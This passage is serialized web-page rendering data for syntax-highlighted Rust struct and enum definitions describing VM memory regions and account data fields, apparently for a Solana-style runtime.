rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[8]}]\n2d7:[\"$\",\"span\",\"code-segment-77\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    ref_to_len_in_vm\"]}]\n2d8:[\"$\",\"span\",\"code-segment-78\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n2d9:[\"$\",\"span\",\"code-segment-79\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n2da:[\"$\",\"span\",\"code-segment-80\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n2db:[\"$\",\"span\",\"code-segment-81\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}]\n2dc:[\"$\",\"span\",\"code-segment-82\",{\"className\":\"$undefined\",\""])</script><script>self.__next_f.push([1,"style\":{},\"children\":[\" \"]}]\n2dd:[\"$\",\"span\",\"code-segment-83\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n2de:[\"$\",\"span\",\"code-segment-84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n2df:[\"$\",\"span\",\"code-segment-85\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n2e0:[\"$\",\"span\",\"code-segment-86\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n2e1:[\"$\",\"span\",\"code-segment-87\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          \"]}]\n2e2:[\"$\",\"span\",\"code-segment-88\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// VM address of AccountInfo.data length\"]}]\n2e3:[\"$\",\"span\",\"code-segment-89\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n2e4:[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[9]}]\n2e5:[\"$\",\"span\",\"code-segment-91\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    serialized_len_ptr\"]}]\n2e6:[\"$\",\"span\",\"code-segment-92\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n2e7:[\"$\",\"span\",\"code-segment-93\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n2e8:[\"$\",\"span\",\"code-segment-94\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n2e9:[\"$\",\"span\",\"code-segment-95\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n2ea:[\"$\",\"span\",\"code-segment-96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n2eb:[\"$\",\"span\",\"code-segment-97\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n2ec:[\"$\",\"span\",\"code-segment-98\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n2ed:[\"$\",\"span\",\"code-segment-99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n2ee:[\"$\",\"span\",\"line-number--10\",{\"cl"])</script><script>self.__next_f.push([1,"assName\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[10]}]\n2ef:[\"$\",\"span\",\"code-segment-101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    executable\"]}]\n2f0:[\"$\",\"span\",\"code-segment-102\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n2f1:[\"$\",\"span\",\"code-segment-103\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n2f2:[\"$\",\"span\",\"code-segment-104\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}]\n2f3:[\"$\",\"span\",\"code-segment-105\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n2f4:[\"$\",\"span\",\"code-segment-106\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n2f5:[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[11]}]\n2f6:[\"$\",\"span\",\"code-segment-108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    rent_epoch\"]}]\n2f7:[\"$\",\"span\",\"code-segment-109\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n2f8:[\"$\",\"span\",\"code-segment-110\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n2f9:[\"$\",\"span\",\"code-segment-111\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n2fa:[\"$\",\"span\",\"code-segment-112\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n2fb:[\"$\",\"span\",\"code-segment-113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n2fc:[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRig"])</script><script>self.__next_f.push([1,"ht\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[12]}]\n2fd:[\"$\",\"span\",\"code-segment-115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n2fe:[\"$\",\"span\",\"code-segment-116\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n2ff:[\"$\",\"span\",\"code-segment-26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr\"]}]\n300:[\"$\",\"span\",\"code-segment-27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n301:[\"$\",\"span\",\"code-segment-28\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n302:[\"$\",\"span\",\"code-segment-29\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n303:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n304:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"             \"]}]\n305:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// start virtual address\"]}]\n306:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n307:[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}]\n308:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n309:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n30a:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr_end\"]}]\n30b:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n30c:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n30d:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n30e:[\"$\",\"span\",\"code-segm"])</script><script>self.__next_f.push([1,"ent-41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n30f:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"         \"]}]\n310:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// end virtual address\"]}]\n311:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n312:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\n313:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n314:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n315:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" len\"]}]\n316:[\"$\",\"span\",\"code-segment-49\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n317:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n318:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n319:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n31a:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                 \"]}]\n31b:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Length in bytes\"]}]\n31c:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n31d:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\n31e:["])</script><script>self.__next_f.push([1,"\"$\",\"span\",\"code-segment-57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n31f:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n320:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_gap_shift\"]}]\n321:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n322:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n323:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\n324:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n325:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"         \"]}]\n326:[\"$\",\"span\",\"code-segment-65\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Address translation parameters\"]}]\n327:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n328:[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\n329:[\"$\",\"span\",\"code-segment-68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n32a:[\"$\",\"span\",\"code-segment-69\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n32b:[\"$\",\"span\",\"code-segment-70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" is_writable\"]}]\n32c:[\"$\",\"span\",\"code-segment-71\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n32d:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n32e:[\"$\",\"span\",\"code-segment-73\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}]\n32f:[\"$\",\"span\",\"code-segment-74\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"chil"])</script><script>self.__next_f.push([1,"dren\":[\",\"]}]\n330:[\"$\",\"span\",\"code-segment-75\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n331:[\"$\",\"span\",\"code-segment-76\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Permission tracking\"]}]\n332:[\"$\",\"span\",\"code-segment-77\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n333:[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[8]}]\n334:[\"$\",\"span\",\"code-segment-79\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n335:[\"$\",\"span\",\"code-segment-80\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n336:[\"$\",\"span\",\"code-segment-26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr\"]}]\n337:[\"$\",\"span\",\"code-segment-27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n338:[\"$\",\"span\",\"code-segment-28\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n339:[\"$\",\"span\",\"code-segment-29\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n33a:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n33b:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"             \"]}]\n33c:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// start virtual address\"]}]\n33d:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n33e:[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}]\n33f:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"$undefined\",\"style\":{},\"ch"])</script><script>self.__next_f.push([1,"ildren\":[\"    \"]}]\n340:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n341:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr_end\"]}]\n342:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n343:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n344:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n345:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n346:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"         \"]}]\n347:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// end virtual address\"]}]\n348:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n349:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\n34a:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n34b:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n34c:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" len\"]}]\n34d:[\"$\",\"span\",\"code-segment-49\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n34e:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n34f:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n350:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n351:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"$undefined\",\"style\":{},\"chi"])</script><script>self.__next_f.push([1,"ldren\":[\"                 \"]}]\n352:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Length in bytes\"]}]\n353:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n354:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\n355:[\"$\",\"span\",\"code-segment-57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n356:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n357:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_gap_shift\"]}]\n358:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n359:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n35a:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\n35b:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n35c:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"         \"]}]\n35d:[\"$\",\"span\",\"code-segment-65\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Address translation parameters\"]}]\n35e:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n35f:[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\n360:[\"$\",\"span\",\"code-segment-68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n361:[\"$\",\"span\",\"code-segment-69\",{\"className\":"])</script><script>self.__next_f.push([1,"\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n362:[\"$\",\"span\",\"code-segment-70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" state\"]}]\n363:[\"$\",\"span\",\"code-segment-71\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n364:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n365:[\"$\",\"span\",\"code-segment-73\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Cell\"]}]\n366:[\"$\",\"span\",\"code-segment-74\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n367:[\"$\",\"span\",\"code-segment-75\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}]\n368:[\"$\",\"span\",\"code-segment-76\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n369:[\"$\",\"span\",\"code-segment-77\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n36a:[\"$\",\"span\",\"code-segment-78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n36b:[\"$\",\"span\",\"code-segment-79\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Permission tracking\"]}]\n36c:[\"$\",\"span\",\"code-segment-80\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n36d:[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[8]}]\n36e:[\"$\",\"span\",\"code-segment-82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n36f:[\"$\",\"span\",\"code-segment-83\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n370:[\"$\",\"span\",\"code-segment-84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n371:[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\""])</script><script>self.__next_f.push([1,"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[9]}]\n372:[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[10]}]\n373:[\"$\",\"span\",\"code-segment-88\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n374:[\"$\",\"span\",\"code-segment-89\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n375:[\"$\",\"span\",\"code-segment-90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n376:[\"$\",\"span\",\"code-segment-91\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"enum\"]}]\n377:[\"$\",\"span\",\"code-segment-92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n378:[\"$\",\"span\",\"code-segment-93\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}]\n379:[\"$\",\"span\",\"code-segment-94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n37a:[\"$\",\"span\",\"code-segment-95\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n37b:[\"$\",\"span\",\"code-segment-96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n37c:[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[11]}]\n37d:[\"$\",\"span\",\"code-segment-98\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n37e:[\"$\",\"span\",\"code-segment-99\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Readable\"]}]\n37f:[\"$\",\"span\",\"code-segment-100\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n380:[\"$\",\"span\",\"code-segment-101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"   \"]}]\n381:[\"$\",\"span\",\"code-segment-10"])</script><script>self.__next_f.push([1,"2\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// The memory region is readable\"]}]\n382:[\"$\",\"span\",\"code-segment-103\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n383:[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[12]}]\n384:[\"$\",\"span\",\"code-segment-105\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n385:[\"$\",\"span\",\"code-segment-106\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Writable\"]}]\n386:[\"$\",\"span\",\"code-segment-107\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n387:[\"$\",\"span\",\"code-segment-108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"   \"]}]\n388:[\"$\",\"span\",\"code-segment-109\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// The memory region is writable\"]}]\n389:[\"$\",\"span\",\"code-segment-110\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n38a:[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[13]}]\n38b:[\"$\",\"span\",\"code-segment-112\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n38c:[\"$\",\"span\",\"code-segment-113\",{\"className\":\"token 